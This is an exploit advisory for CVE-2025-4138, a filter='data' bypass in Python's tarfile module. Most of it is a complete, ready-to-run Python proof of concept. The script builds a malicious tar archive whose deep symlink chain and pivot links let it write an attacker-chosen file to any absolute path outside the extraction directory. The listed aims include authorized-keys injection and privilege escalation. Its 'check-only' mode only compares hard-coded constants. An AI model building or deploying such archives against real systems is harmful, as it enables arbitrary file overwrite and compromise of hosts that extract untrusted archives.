@@ -1,0 +1,243 @@
+=============================================================================================================================================
+| # Title     : Python tarfile filter="data" Bypass via PATH_MAX Symlink Chain                                                              |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.python.org/                                                                                                     |
+=============================================================================================================================================
+
+[+] Summary    :  This Proof of Concept (PoC) targets CVE-2025-4138, a vulnerability in Python’s built-in tarfile module when extracting archives using filter="data".
+                  The issue allows a crafted archive to bypass intended path restrictions by abusing filesystem path length handling and symbolic link resolution.
+
+[+] The attack relies on:
+
+Building a deep symlink chain that approaches the system’s PATH_MAX limit.
+
+Using very long directory names (247 characters each) repeated across multiple nested levels.
+
+Creating carefully structured symbolic links that pivot path resolution outside the intended extraction directory.
+
+Writing an arbitrary file to an absolute attacker-controlled path, escaping the extraction root.
+
+The technique manipulates path normalization and symlink resolution behavior during archive extraction.
+
+[+] Key Characteristics :
+
+Dynamically detects PATH_MAX depending on OS:
+
+Linux (typically 4096)
+
+macOS (typically 1024)
+
+Windows (MAX_PATH 260)
+
+Generates a malicious .tar archive.
+
+Allows custom file permission mode for the payload.
+
+Includes a --check-only mode to test whether the system may be vulnerable without building the archive.
+
+Requires the target file path to be absolute.
+
+[+] Affected Versions :
+
+Python 3.12.0 – 3.12.10
+
+Python 3.13.0 – 3.13.3
+
+[+] Fixed In ;
+
+Python 3.12.11
+
+Python 3.13.4
+
+[+] Impact  :
+
+If a vulnerable system extracts a malicious archive using tarfile with filter="data" and insufficient path validation:
+
+Arbitrary file write outside the intended extraction directory becomes possible.
+
+[+] This may lead to:
+
+Configuration overwrite
+
+Authorized keys injection
+
+Service hijacking
+
+Privilege escalation (depending on execution context)
+
+Impact severity depends on:
+
+The privileges of the extraction process
+
+The writable filesystem locations
+
+Application behavior after extraction
+
+[+] POC : 
+
+#!/usr/bin/env python3
+
+import argparse
+import io
+import os
+import tarfile
+import sys
+
+DIR_LEN = 247
+
+CHARS = "abcdefghijklmnop"
+
+def get_path_max():
+    """Determine PATH_MAX based on the operating system"""
+    import platform
+    system = platform.system()
+    if system == "Linux":
+        return 4096
+    elif system == "Darwin":  
+        return 1024
+    elif system == "Windows":
+        return 260 
+    else:
+        return 4096  
+
+def build_tar(tar_path, target_file, payload, mode):
+
+    if not os.path.isabs(target_file):
+        raise ValueError(f"Target path must be absolute: {target_file}")
+    
+    target_dir = os.path.dirname(target_file)
+    target_name = os.path.basename(target_file)
+ 
+    if not target_name:
+        raise ValueError(f"Target file has no basename: {target_file}")
+    
+    long_dir = "d" * DIR_LEN  
+    path_max = get_path_max()
+    
+    print(f"[*] PATH_MAX detected: {path_max}")
+    print(f"[*] Chain length: {len(CHARS) * DIR_LEN} bytes")
+    
+    if len(CHARS) * DIR_LEN >= path_max:
+        print(f"[!] Warning: Chain length may exceed PATH_MAX on this system")
+
+    with tarfile.open(tar_path, "w") as tar:
+        prefix = ""
+        for i, char in enumerate(CHARS):
+
+            d = tarfile.TarInfo(os.path.join(prefix, long_dir))
+            d.type = tarfile.DIRTYPE
+            d.mode = 0o755  
+            d.uid = 0
+            d.gid = 0
+            d.uname = "root"
+            d.gname = "root"
+            tar.addfile(d)
+
+            s = tarfile.TarInfo(os.path.join(prefix, char))
+            s.type = tarfile.SYMTYPE
+            s.linkname = long_dir
+            s.mode = 0o777  
+            s.size = 0   
+            s.uid = 0
+            s.gid = 0
+            tar.addfile(s)
+
+            prefix = os.path.join(prefix, long_dir)
+
+        short_chain = "/".join(CHARS)  # "a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p"
+        pivot_name = os.path.join(short_chain, "l" * 254)
+        pivot = tarfile.TarInfo(pivot_name)
+        pivot.type = tarfile.SYMTYPE
+        pivot.linkname = "../" * len(CHARS) 
+        pivot.mode = 0o777
+        pivot.size = 0
+        pivot.uid = 0
+        pivot.gid = 0
+        tar.addfile(pivot)
+
+        escape_name = "escape"
+        escape = tarfile.TarInfo(escape_name)
+        escape.type = tarfile.SYMTYPE
+
+        dir_count = len(CHARS) + 1  
+        target_dir_clean = target_dir.lstrip('/')
+        if target_dir_clean:
+            escape.linkname = pivot_name + "/" + ("../" * dir_count) + target_dir_clean
+        else:
+            escape.linkname = pivot_name + "/" + ("../" * dir_count)
+        
+        escape.mode = 0o777
+        escape.size = 0
+        escape.uid = 0
+        escape.gid = 0
+        tar.addfile(escape)
+
+        f = tarfile.TarInfo(f"{escape_name}/{target_name}")
+        f.type = tarfile.REGTYPE
+        f.size = len(payload)
+        f.mode = mode
+        f.uid = 0
+        f.gid = 0
+        f.uname = "root"
+        f.gname = "root"
+        
+        print(f"[*] Adding payload: {f.name} -> {target_file}")
+        print(f"[*] Payload size: {f.size} bytes")
+        print(f"[*] File mode: {oct(f.mode)}")
+        
+        tar.addfile(f, io.BytesIO(payload))
+    
+    print(f"[+] Malicious tar created: {tar_path}")
+
+def main():
+    p = argparse.ArgumentParser(description="CVE-2025-4138 tarfile filter bypass")
+    p.add_argument("-o", "--output", required=True, help="output tar path")
+    p.add_argument("-t", "--target", required=True, help="absolute path to write to on target")
+    p.add_argument("-p", "--payload", required=True, help="File to use as a payload")
+    p.add_argument("-m", "--mode", required=False, default="0644", help="Set file permissions (default: 0644)")
+    p.add_argument("--check-only", action="store_true", help="Only check if target is vulnerable")
+
+    args = p.parse_args()
+
+    if not os.path.isabs(args.target):
+        print(f"[-] Error: Target path must be absolute: {args.target}")
+        sys.exit(1)
+    
+    payload_path = os.path.expanduser(args.payload)
+    
+    if not os.path.exists(payload_path):
+        print(f"[-] Payload file not found: {payload_path}")
+        sys.exit(1)
+    
+    with open(payload_path, "rb") as fh:
+        payload = fh.read()
+
+    if not payload.endswith(b"\n"):
+        payload += b"\n"
+    
+    if args.check_only:
+        print("[*] Checking system vulnerability...")
+        path_max = get_path_max()
+        chain_length = len(CHARS) * DIR_LEN
+        print(f"[*] PATH_MAX: {path_max}")
+        print(f"[*] Chain length: {chain_length}")
+        
+        if chain_length < path_max:
+            print("[+] System appears vulnerable (chain length < PATH_MAX)")
+        else:
+            print("[-] System may not be vulnerable (chain length >= PATH_MAX)")
+        return
+    
+    try:
+        build_tar(args.output, args.target, payload, int(args.mode, 8))
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
